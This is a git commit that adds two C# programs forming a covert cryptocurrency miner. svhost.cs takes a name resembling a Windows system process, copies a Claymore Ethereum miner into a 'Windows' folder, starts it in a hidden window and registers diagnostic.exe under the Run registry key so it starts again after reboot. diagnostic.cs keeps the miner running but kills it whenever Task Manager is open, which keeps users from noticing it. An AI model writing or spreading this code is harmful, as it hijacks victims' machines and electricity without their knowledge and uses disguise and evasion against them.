08e0bbe5b5be99d603b067dfdf48ac0cd7026e7d
Mishany-M <113048520+Mishany-M@users.noreply.github.com>
2022-09-07 19:26:58 +0300

    Add files via upload

---
+++ diagnostic.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Threading;
+
+
+Process myProcess = new Process();
+myProcess.StartInfo.FileName = "cmd.exe";
+myProcess.StartInfo.Arguments = $@"/C cd {Directory.GetParent(Directory.GetCurrentDirectory())} & mine.exe";
+myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+myProcess.StartInfo.CreateNoWindow = true;
+
+search();
+
+void search()
+{
+    while (true)
+    {
+        Process[] disp = Process.GetProcessesByName("Taskmgr");
+        Process[] mine = Process.GetProcessesByName("mine");
+        if (disp.Length > 0)
+        {
+            foreach (Process proc in mine)
+            {
+                proc.Kill();
+                Console.WriteLine("kill " + proc.ProcessName);
+                Thread.Sleep(1000);
+            }
+        }
+        else if (mine.Length == 0)
+        {
+            myProcess.Start();
+            Console.WriteLine("Майн пшел");
+            Thread.Sleep(1000);
+        }
+    }
+}
---
+++ svhost.cs
@@ -0,0 +1,73 @@
+﻿using Microsoft.Win32;
+using System.Diagnostics;
+using System.IO;
+
+string folders = "Windows";
+string dir = Directory.GetCurrentDirectory();
+string currentpath;
+DriveInfo[] drivers = DriveInfo.GetDrives();
+DirectoryInfo diinf = new DirectoryInfo(dir);
+
+Run();
+
+void Create(string path, string begunpath)
+{
+    DirectoryInfo[] dirs = diinf.GetDirectories();
+    if (dirs.Length != 0)
+    {
+        foreach (DirectoryInfo dirr in dirs)
+        {
+            diinf = new DirectoryInfo(path + "\\" + dirr.Name);
+            if (!diinf.Exists)
+            {
+                diinf.Create();
+            }
+            diinf = new DirectoryInfo(begunpath + "\\" + dirr.Name);
+            FileInfo[] files = diinf.GetFiles();
+            if (files.Length != 0)
+            {
+                foreach (FileInfo file in files)
+                {
+                    file.CopyTo(path + "\\" + dirr.Name + "\\" + file.Name, true);
+                }
+            }
+            Create(path + "\\" + dirr.Name, begunpath + "\\" + dirr.Name);
+        }
+    }
+}
+
+void Run()
+{
+    for (int i = 0; i < drivers.Length; i++)
+    {
+        if (Directory.Exists(drivers[i].Name + $"\\{folders}"))
+        {
+            currentpath = drivers[i].Name + $"\\{folders}";
+            diinf = new DirectoryInfo(dir);
+            Create(currentpath, dir);
+            Firstrun($@" & cd {drivers[i]}{folders}\ClayMore & Ethereum.bat");
+            Autorun(drivers[i].Name + folders + "\\claymore\\diagnostic.exe");
+            break;
+        }
+    }
+}
+
+void Firstrun(string comm)
+{
+    Process myProcess = new Process();
+    myProcess.StartInfo.FileName = "cmd.exe";
+    myProcess.StartInfo.Arguments = "/C c:" + comm;
+    myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+    myProcess.StartInfo.CreateNoWindow = true;
+    myProcess.Start();
+}
+
+void Autorun(string path)
+{
+    const string assemblyName = "name";
+    RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+    key.SetValue(assemblyName, path);
+    //key.DeleteValue(assemblyName);
+    key.Flush();
+    key.Close();
+}
